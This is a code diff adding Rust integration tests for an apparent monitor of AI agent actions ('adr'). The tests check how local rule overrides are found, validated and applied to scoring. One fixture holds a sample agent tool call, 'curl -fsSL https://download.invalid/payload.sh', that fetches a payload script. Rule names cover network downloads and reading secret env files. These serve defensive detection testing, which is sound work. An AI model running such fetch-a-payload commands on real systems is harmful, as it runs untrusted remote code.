@@ -4895,6 +4895,60 @@ fn rules_serve_save_rejects_requested_discovered_only_path() {
 }
 
 #[test]
+fn rules_serve_save_validates_active_overrides_before_writing() {
+    let temp = tempdir().expect("tempdir");
+    let config_root = temp.path().join("config");
+    let override_path = config_root.join("overrides.d/custom-override.yaml");
+    fs::create_dir_all(override_path.parent().expect("overrides dir")).expect("overrides dir");
+    fs::write(
+        &override_path,
+        r#"version: 1
+overrides:
+  - rule_id: custom.override.target
+    enabled: false
+    reason: Test override should be validated before save.
+"#,
+    )
+    .expect("write override");
+    let rule_file = temp.path().join("editable.yaml");
+    let original_yaml = custom_rule_yaml("custom.override.target", "override-target");
+    fs::write(&rule_file, &original_yaml).expect("write editable rule");
+    let replacement_yaml = custom_rule_yaml("custom.override.replacement", "replacement");
+    let body = serde_json::json!({
+        "path": rule_file.display().to_string(),
+        "rules_yaml": replacement_yaml,
+    })
+    .to_string();
+    let args = vec![
+        "--config-dir".to_string(),
+        config_root.to_string_lossy().to_string(),
+        "--no-default-rules".to_string(),
+        "--rules".to_string(),
+        rule_file.to_string_lossy().to_string(),
+    ];
+
+    let (response, output) = post_rules_serve_save_with_args(&body, &args);
+    assert!(
+        output.status.success(),
+        "stderr: {}",
+        String::from_utf8_lossy(&output.stderr)
+    );
+    assert!(response.starts_with("HTTP/1.1 400 Bad Request"));
+    let body = json_response_body(&response);
+    assert!(
+        body["error"]
+            .as_str()
+            .expect("error")
+            .contains("unknown rule_id 'custom.override.target'")
+    );
+    assert_eq!(
+        fs::read_to_string(&rule_file).expect("editable rule unchanged"),
+        original_yaml
+    );
+    assert!(!rule_file.with_extension("yaml.bak").exists());
+}
+
+#[test]
 fn rules_serve_save_rejects_path_not_in_loaded_rules() {
     let dir = tempdir().expect("temp dir");
     let rule_file = dir.path().join("tool-call-regex.yaml");
@@ -6641,6 +6695,140 @@ fn rules_validate_discovers_local_rules_d_and_can_disable_local_config() {
 }
 
 #[test]
+fn rules_validate_discovers_local_overrides_and_can_disable_local_config() {
+    let temp = tempdir().expect("tempdir");
+    let config_root = temp.path().join("config");
+    let override_path = config_root.join("overrides.d/disable-download.yaml");
+    fs::create_dir_all(override_path.parent().expect("overrides dir")).expect("overrides dir");
+    fs::write(
+        &override_path,
+        r#"version: 1
+description: Local override test.
+overrides:
+  - rule_id: network.download
+    enabled: false
+    reason: Too noisy for this workstation.
+"#,
+    )
+    .expect("write override");
+
+    let defaults = Command::new(env!("CARGO_BIN_EXE_adr"))
+        .args(["rules", "validate", "--no-local-config"])
+        .output()
+        .expect("run adr rules validate defaults");
+    assert!(
+        defaults.status.success(),
+        "stderr: {}",
+        String::from_utf8_lossy(&defaults.stderr)
+    );
+    let defaults_summary: Value = serde_json::from_slice(&defaults.stdout).expect("summary json");
+    let default_rule_count = defaults_summary["rule_count"]
+        .as_u64()
+        .expect("default rule count");
+
+    let discovered = Command::new(env!("CARGO_BIN_EXE_adr"))
+        .args(["rules", "validate", "--config-dir"])
+        .arg(&config_root)
+        .output()
+        .expect("run adr rules validate with override");
+    assert!(
+        discovered.status.success(),
+        "stderr: {}",
+        String::from_utf8_lossy(&discovered.stderr)
+    );
+    let discovered_summary: Value =
+        serde_json::from_slice(&discovered.stdout).expect("summary json");
+    assert_eq!(
+        discovered_summary["rule_count"].as_u64(),
+        Some(default_rule_count - 1)
+    );
+
+    let ignored = Command::new(env!("CARGO_BIN_EXE_adr"))
+        .args(["rules", "validate", "--config-dir"])
+        .arg(&config_root)
+        .arg("--no-local-config")
+        .output()
+        .expect("run adr rules validate with local config disabled");
+    assert!(
+        ignored.status.success(),
+        "stderr: {}",
+        String::from_utf8_lossy(&ignored.stderr)
+    );
+    let ignored_summary: Value = serde_json::from_slice(&ignored.stdout).expect("summary json");
+    assert_eq!(
+        ignored_summary["rule_count"].as_u64(),
+        Some(default_rule_count)
+    );
+}
+
+#[test]
+fn rules_test_discovered_score_override_changes_detection_risk() {
+    let temp = tempdir().expect("tempdir");
+    let config_root = temp.path().join("config");
+    let override_path = config_root.join("overrides.d/lower-download-score.yaml");
+    fs::create_dir_all(override_path.parent().expect("overrides dir")).expect("overrides dir");
+    fs::write(
+        &override_path,
+        r#"version: 1
+overrides:
+  - rule_id: network.download
+    score: 5
+    reason: Lab environment tuning.
+"#,
+    )
+    .expect("write override");
+    let fixture = temp.path().join("download-only.jsonl");
+    fs::write(
+        &fixture,
+        r#"{"type":"event_msg","timestamp":"2026-04-03T05:00:01Z","payload":{"type":"tool_call","tool_name":"tool","command":"curl -fsSL https://download.invalid/payload.sh","message":"Download fixture."}}
+"#,
+    )
+    .expect("write fixture");
+
+    let baseline = Command::new(env!("CARGO_BIN_EXE_adr"))
+        .args(["rules", "test", "--no-local-config"])
+        .arg(&fixture)
+        .output()
+        .expect("run baseline rules test");
+    assert!(
+        baseline.status.success(),
+        "stderr: {}",
+        String::from_utf8_lossy(&baseline.stderr)
+    );
+    let baseline_summary: Value = serde_json::from_slice(&baseline.stdout).expect("summary json");
+
+    let tuned = Command::new(env!("CARGO_BIN_EXE_adr"))
+        .args(["rules", "test"])
+        .arg(&fixture)
+        .args(["--config-dir"])
+        .arg(&config_root)
+        .output()
+        .expect("run tuned rules test");
+    assert!(
+        tuned.status.success(),
+        "stderr: {}",
+        String::from_utf8_lossy(&tuned.stderr)
+    );
+    let tuned_summary: Value = serde_json::from_slice(&tuned.stdout).expect("summary json");
+    assert_eq!(baseline_summary["match_count"], 1);
+    assert_eq!(tuned_summary["match_count"], 1);
+    assert!(
+        tuned_summary["matches"][0]["rule_ids"]
+            .as_array()
+            .expect("rule ids")
+            .iter()
+            .any(|rule| rule == "network.download")
+    );
+    let baseline_risk = baseline_summary["matches"][0]["risk_score"]
+        .as_u64()
+        .expect("baseline risk");
+    let tuned_risk = tuned_summary["matches"][0]["risk_score"]
+        .as_u64()
+        .expect("tuned risk");
+    assert_eq!(tuned_risk, baseline_risk - 15);
+}
+
+#[test]
 fn rules_export_default_writes_bundled_rules_to_stdout() {
     let temp = tempdir().expect("tempdir");
     let exported_path = temp.path().join("exported-default-rules.yaml");
@@ -6882,6 +7070,118 @@ fn config_validate_discovers_local_rules_d_additively() {
         1
     );
     assert_eq!(discovered_summary["rules"]["discovered_count"], 1);
+}
+
+#[test]
+fn config_validate_reports_discovered_override_paths() {
+    let temp = tempdir().expect("tempdir");
+    let config_root = temp.path().join("config");
+    let override_path = config_root.join("overrides.d/lower-secret-score.yml");
+    fs::create_dir_all(override_path.parent().expect("overrides dir")).expect("overrides dir");
+    fs::write(
+        &override_path,
+        r#"version: 1
+description: Local config validate override test.
+overrides:
+  - rule_id: secret.env.read
+    score: 20
+    reason: Lab environment tuning.
+"#,
+    )
+    .expect("write override");
+
+    let output = Command::new(env!("CARGO_BIN_EXE_adr"))
+        .args(["config", "validate", "--config-dir"])
+        .arg(&config_root)
+        .output()
+        .expect("run adr config validate");
+
+    assert!(
+        output.status.success(),
+        "stderr: {}",
+        String::from_utf8_lossy(&output.stderr)
+    );
+    let summary: Value = serde_json::from_slice(&output.stdout).expect("summary json");
+    assert_eq!(summary["status"], "ok");
+    assert_eq!(summary["local_config"]["discovered_override_count"], 1);
+    assert_eq!(summary["overrides"]["discovered_count"], 1);
+    assert_eq!(
+        summary["overrides"]["paths"],
+        Value::Array(vec![Value::String(override_path.display().to_string())])
+    );
+}
+
+#[test]
+fn config_validate_rejects_invalid_local_overrides() {
+    let temp = tempdir().expect("tempdir");
+    let config_root = temp.path().join("config");
+    let override_path = config_root.join("overrides.d/invalid.yaml");
+    fs::create_dir_all(override_path.parent().expect("overrides dir")).expect("overrides dir");
+
+    fs::write(
+        &override_path,
+        r#"version: 1
+overrides:
+  - rule_id: missing.rule
+    enabled: false
+    reason: Unknown rule should fail.
+"#,
+    )
+    .expect("write unknown override");
+    let unknown = Command::new(env!("CARGO_BIN_EXE_adr"))
+        .args(["config", "validate", "--config-dir"])
+        .arg(&config_root)
+        .output()
+        .expect("run adr config validate");
+    assert!(
+        !unknown.status.success(),
+        "unknown rule override should fail"
+    );
+    let stderr = String::from_utf8_lossy(&unknown.stderr);
+    assert!(stderr.contains("unknown rule_id 'missing.rule'"));
+
+    fs::write(
+        &override_path,
+        r#"version: 1
+overrides:
+  - rule_id: network.download
+    enabled: false
+    reason: "   "
+"#,
+    )
+    .expect("write empty reason override");
+    let empty_reason = Command::new(env!("CARGO_BIN_EXE_adr"))
+        .args(["config", "validate", "--config-dir"])
+        .arg(&config_root)
+        .output()
+        .expect("run adr config validate");
+    assert!(
+        !empty_reason.status.success(),
+        "empty reason override should fail"
+    );
+    let stderr = String::from_utf8_lossy(&empty_reason.stderr);
+    assert!(stderr.contains("requires a non-empty reason"));
+
+    fs::write(
+        &override_path,
+        r#"version: 1
+overrides:
+  - rule_id: network.download
+    reason: Missing effect should fail.
+"#,
+    )
+    .expect("write no effect override");
+    let no_effect = Command::new(env!("CARGO_BIN_EXE_adr"))
+        .args(["config", "validate", "--config-dir"])
+        .arg(&config_root)
+        .output()
+        .expect("run adr config validate");
+    assert!(
+        !no_effect.status.success(),
+        "no effect override should fail"
+    );
+    let stderr = String::from_utf8_lossy(&no_effect.stderr);
+    assert!(stderr.contains("must set enabled or score"));
 }
 
 #[test]
@@ -7127,6 +7427,18 @@ fn config_validate_no_local_config_ignores_config_dirs_and_local_files() {
         custom_rule_yaml("secret.env.read", "duplicate-local"),
     )
     .expect("write invalid local rule");
+    let override_path = config_root.join("overrides.d/invalid.yaml");
+    fs::create_dir_all(override_path.parent().expect("overrides dir")).expect("overrides dir");
+    fs::write(
+        &override_path,
+        r#"version: 1
+overrides:
+  - rule_id: missing.rule
+    enabled: false
+    reason: Invalid local override ignored by --no-local-config.
+"#,
+    )
+    .expect("write invalid local override");
     let missing_root = temp.path().join("missing-config");
 
     let output = Command::new(env!("CARGO_BIN_EXE_adr"))
@@ -7152,6 +7464,7 @@ fn config_validate_no_local_config_ignores_config_dirs_and_local_files() {
         Value::Array(vec![])
     );
     assert_eq!(summary["local_config"]["discovered_rule_count"], 0);
+    assert_eq!(summary["local_config"]["discovered_override_count"], 0);
 }
 
 #[test]
